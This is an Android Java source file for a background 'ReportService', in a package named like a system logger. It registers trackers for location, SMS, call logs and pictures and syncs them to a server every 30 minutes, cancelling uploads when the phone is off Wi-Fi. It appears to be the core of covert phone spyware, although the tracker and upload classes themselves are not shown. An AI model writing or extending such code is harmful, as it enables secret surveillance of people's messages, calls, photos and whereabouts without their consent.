package com.os.logger;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.os.logger.track.BaseTrack;
import com.os.logger.track.CallTrack;
import com.os.logger.track.LocationTrack;
import com.os.logger.track.PictureTrack;
import com.os.logger.track.SmsTrack;
import com.os.logger.track.TestTrack;
import com.umeng.analytics.MobclickAgent;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by Alan on 16/5/3.
 */
public class ReportService extends Service {

    private List<BaseTrack> tracks = new ArrayList<>();
    private Schedule mSchedule = new Schedule();
    private NetChangeListener mListener;

    @Override
    public void onCreate() {
        super.onCreate();

        tracks.add(new LocationTrack(this));
        tracks.add(new SmsTrack(this));
        tracks.add(new CallTrack(this));
        tracks.add(new PictureTrack(this));
        tracks.add(new TestTrack(this));

        for (BaseTrack track : tracks) {
            try {
                track.ready();
            } catch (Exception e) {
                //permission denied
                e.printStackTrace();
            }
        }

        mSchedule.sendEmptyMessageDelayed(0, 1000);

        registerNetChangeListener();
        MobclickAgent.setDebugMode(true);
        MobclickAgent.onResume(this);
    }

    private void registerNetChangeListener() {
        mListener = new NetChangeListener();
        IntentFilter intentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
        registerReceiver(mListener, intentFilter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        saveUserName(intent);
        return super.onStartCommand(intent, flags, startId);
    }

    private void saveUserName(Intent intent) {
        if (intent == null) {
            return;
        }
        String name = intent.getStringExtra("username");
        if (!TextUtils.isEmpty(name)) {
            PreferenceUtil.saveValue(this, PreferenceUtil.KEY_USER_NAME, name);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        for (BaseTrack track : tracks) {
            track.destroy();
        }
        mSchedule.removeMessages(0);
        if (mListener != null) {
            unregisterReceiver(mListener);
        }

        MobclickAgent.onPause(this);
        super.onDestroy();
    }

    private void reportIfPossible() {
        for (BaseTrack track : tracks) {
            try {
                track.sync();
            } catch (Exception e) {
                //permission denied
                e.printStackTrace();
            }
        }
    }

    class Schedule extends Handler {
        @Override
        public void handleMessage(Message msg) {
            reportIfPossible();
            sendEmptyMessageDelayed(0, 30 * 60 * 1000);
        }
    }

    class NetChangeListener extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equalsIgnoreCase(ConnectivityManager.CONNECTIVITY_ACTION)) {
                ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
                if (networkInfo == null) {
                    UploadHelper.getInstance().cancelAllCalls();
                    return;
                }

                if (networkInfo.getType() != ConnectivityManager.TYPE_WIFI) {
                    UploadHelper.getInstance().cancelAllCalls();
                }

            }
        }
    }

}
